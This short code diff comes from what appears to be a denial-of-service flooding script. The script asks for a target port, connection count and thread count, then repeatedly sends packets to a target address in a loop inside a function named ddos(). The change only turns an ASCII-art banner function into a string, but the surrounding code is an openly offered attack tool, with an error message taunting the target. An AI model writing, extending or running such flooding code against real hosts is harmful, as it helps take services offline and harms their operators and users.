@@ -16,8 +16,7 @@ port = int(input("\033[91m[ ✿ ] PORT >> "))
 times = int(input("\033[91m[ ✿ ] CONNECTIONS >>"))
 threads = int(input("\033[91m[ ✿ ] THREADS >>"))
 
-def attack():
-	print("""
+banner = """
 \033[91m╔════════════════════════════════════════╗
 \033[91m║ \033[33m┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋╋╋┏┳━━━┓╋╋╋╋╋┏┓   \033[91m ║
 \033[91m║ \033[33m┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃╋╋╋╋╋╋┃┃┏━┓┃╋╋╋╋┏┛┗┓ \033[91m║
@@ -48,7 +47,7 @@ def ddos():
 				s.sendto(data,addr)
 				s.sendto(data,addr)
 				s.sendto(data,addr)
-			attack()
+			print(banner)
 		except:
 			print("[ # ] Down Kah Dek?? Sksksks...")
 
